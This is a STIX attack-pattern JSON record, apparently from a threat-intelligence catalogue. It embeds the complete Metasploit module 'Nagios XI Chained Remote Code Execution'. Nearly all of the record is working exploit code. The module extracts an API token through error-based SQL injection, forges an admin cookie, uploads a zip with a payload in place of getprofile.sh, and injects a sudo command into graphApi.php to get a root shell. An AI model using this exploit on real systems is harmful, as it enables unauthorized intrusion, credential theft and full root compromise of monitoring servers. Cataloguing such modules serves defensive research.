{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1888741b-1666-4e7e-8e7c-da57617ffbee",
    "created": "2024-08-14T17:02:22.629583Z",
    "modified": "2024-08-14T17:02:22.629587Z",
    "name": "Nagios XI Chained Remote Code Execution",
    "description": " This module exploits an SQL injection, auth bypass, file upload command injection, and privilege escalation in Nagios XI <= 5.2.7 to pop a root shell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_chained_rce.rb",
            "external_id": "nagios_xi_chained_rce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nagios XI Chained Remote Code Execution',\n      'Description'    => %q{\n        This module exploits an SQL injection, auth bypass, file upload,\n        command injection, and privilege escalation in Nagios XI <= 5.2.7\n        to pop a root shell.\n      },\n      'Author'         => [\n        'Francesco Oddo', # Vulnerability discovery\n        'wvu'             # Metasploit module\n      ],\n      'References'     => [\n        ['EDB', '39899']\n      ],\n      'DisclosureDate' => '2016-03-06',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'Targets'        => [\n        ['Nagios XI <= 5.2.7', version: Rex::Version.new('5.2.7')]\n      ],\n      'DefaultTarget'  => 0\n    ))\n\n    register_options([\n      OptInt.new('USER_ID',      [true, 'User ID in the database to target', 1]),\n      OptString.new('API_TOKEN', [false, 'If an API token was already stolen, skip the SQLi'])\n    ])\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    res = send_request_cgi!(\n      'method' => 'GET',\n      'uri'    => '/nagiosxi/'\n    )\n\n    return unless res && (html = res.get_html_document)\n\n    if (version = html.at('//input[@name = \"version\"]/@value'))\n      vprint_status(\"Nagios XI version: #{version}\")\n      if Rex::Version.new(version) <= target[:version]\n        return CheckCode::Appears\n      end\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Vulnerable version not found! punt!')\n    end\n\n    if datastore['API_TOKEN']\n      @api_token = datastore['API_TOKEN']\n    else\n      print_status('Getting API token')\n      get_api_token\n    end\n    print_status('Getting admin cookie')\n    get_admin_cookie\n    print_status('Getting monitored host')\n    get_monitored_host\n\n    print_status('Downloading component')\n    download_profile_component\n    print_status('Uploading root shell')\n    upload_root_shell\n    print_status('Popping shell!')\n    pop_dat_shell\n  end\n\n  #\n  # Cleanup methods\n  #\n\n  def on_new_session(session)\n    super\n\n    print_status('Cleaning up...')\n\n    commands = [\n      'rm -rf ../profile',\n      'unzip -qd .. ../../../../tmp/component-profile.zip',\n      'chown -R nagios:nagios ../profile',\n      \"rm -f ../../../../tmp/component-#{zip_filename}\"\n    ]\n\n    commands.each do |command|\n      vprint_status(command)\n      session.shell_command_token(command)\n    end\n  end\n\n  #\n  # Exploit methods\n  #\n\n  def get_api_token\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => '/nagiosxi/includes/components/nagiosim/nagiosim.php',\n      'vars_get' => {\n        'mode'   => 'resolve',\n        'host'   => '\\'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((' \\\n                    \"SELECT backend_ticket FROM xi_users WHERE user_id=#{datastore['USER_ID']}\" \\\n                    '),FLOOR(RAND(0)*2))x ' \\\n                    'FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- '\n      }\n    )\n\n    # default admin token is shorter, ie 27o3b7mu1 shortened to 27o3b7mu\n    # any other user has a longer token, but we cant strip the last char off.\n    # example: 8ftgcj2jubs8nrjnlga0ssakeen4ij8p339cl8shgom7kau7n86j3d6grsidgp6g\n    if res && res.body =~ /Duplicate entry '(.*?).'/\n      if $1.length > 8\n        res.body =~ /Duplicate entry '(.*?)'/\n      end\n      @api_token = $1\n      vprint_good(\"API token: #{@api_token}\")\n    else\n      fail_with(Failure::UnexpectedReply, 'API token not found! punt!')\n    end\n  end\n\n  def get_admin_cookie\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => '/nagiosxi/rr.php',\n      'vars_get' => {\n        'uid'    => \"#{datastore['USER_ID']}-#{Rex::Text.rand_text_alpha(8)}-\" +\n                    Digest::MD5.hexdigest(@api_token)\n      }\n    )\n\n    if res && (@admin_cookie = res.get_cookies.split('; ').last)\n      vprint_good(\"Admin cookie: #{@admin_cookie}\")\n      get_csrf_token(res.body)\n    else\n      fail_with(Failure::NoAccess, 'Admin cookie not found! punt!')\n    end\n  end\n\n  def get_csrf_token(body)\n    if body =~ /nsp_str = \"(.*?)\"/\n      @csrf_token = $1\n      vprint_good(\"CSRF token: #{@csrf_token}\")\n    else\n      fail_with(Failure::UnexpectedReply, 'CSRF token not found! punt!')\n    end\n  end\n\n  def get_monitored_host\n    res = send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => '/nagiosxi/ajaxhelper.php',\n      'cookie'   => @admin_cookie,\n      'vars_get' => {\n        'cmd'    => 'getxicoreajax',\n        'opts'   => '{\"func\":\"get_hoststatus_table\"}',\n        'nsp'    => @csrf_token\n      }\n    )\n\n    return unless res && (html = res.get_html_document)\n\n    if (@monitored_host = html.at('//div[@class = \"hostname\"]/a/text()'))\n      vprint_good(\"Monitored host: #{@monitored_host}\")\n    else\n      fail_with(Failure::UnexpectedReply, 'Monitored host not found! punt!')\n    end\n  end\n\n  def download_profile_component\n    res = send_request_cgi(\n      'method'     => 'GET',\n      'uri'        => '/nagiosxi/admin/components.php',\n      'cookie'     => @admin_cookie,\n      'vars_get'   => {\n        'download' => 'profile'\n      }\n    )\n\n    if res && res.body =~ /^PK\\x03\\x04/\n      @profile_component = res.body\n    else\n      fail_with(Failure::UnexpectedReply, 'Failed to download component! punt!')\n    end\n  end\n\n  def upload_root_shell\n    vars_form_data = [\n      { 'name' => 'nsp', 'data' => @csrf_token },\n      { 'name' => 'upload', 'data' => 1 },\n      { 'name' => 'MAX_FILE_SIZE', 'data' => 1000000 },\n      { 'name' => 'uploadedfile', 'data' => payload_zip, 'content_type' => 'application/zip', 'encoding' => 'binary', 'filename' => zip_filename }\n    ]\n\n    res = send_request_cgi!(\n      'method' => 'POST',\n      'uri'    => '/nagiosxi/admin/components.php',\n      'cookie' => @admin_cookie,\n      'vars_form_data'  => vars_form_data\n    )\n\n    if res && res.code != 200\n      if res.redirect? && res.redirection.path == '/nagiosxi/install.php'\n        vprint_warning('Nagios XI not configured')\n      else\n        fail_with(Failure::PayloadFailed, 'Failed to upload root shell! punt!')\n      end\n    end\n  end\n\n  def pop_dat_shell\n    send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => '/nagiosxi/includes/components/perfdata/graphApi.php',\n      'cookie'   => @admin_cookie,\n      'vars_get' => {\n        'host'   => @monitored_host,\n        'end'    => ';sudo ../profile/getprofile.sh #'\n      }\n    )\n  end\n\n  #\n  # Support methods\n  #\n\n  def payload_zip\n    zip = Rex::Zip::Archive.new\n\n    Zip::File.open_buffer(@profile_component) do |z|\n      z.each do |f|\n        zip.entries << Rex::Zip::Entry.new(\n          f.name,\n          (if f.ftype == :file\n            if f.name == 'profile/getprofile.sh'\n              payload.encoded\n            else\n              z.read(f)\n            end\n          else\n            ''\n          end),\n          Rex::Zip::CM_DEFLATE,\n          nil,\n          (Rex::Zip::EFA_ISDIR if f.ftype == :directory)\n        )\n      end\n    end\n\n    zip.pack\n  end\n\n  #\n  # Utility methods\n  #\n\n  def zip_filename\n    @zip_filename ||= Rex::Text.rand_text_alpha(8) + '.zip'\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-06",
    "x_mitre_platforms": [
        "unix'"
    ]
}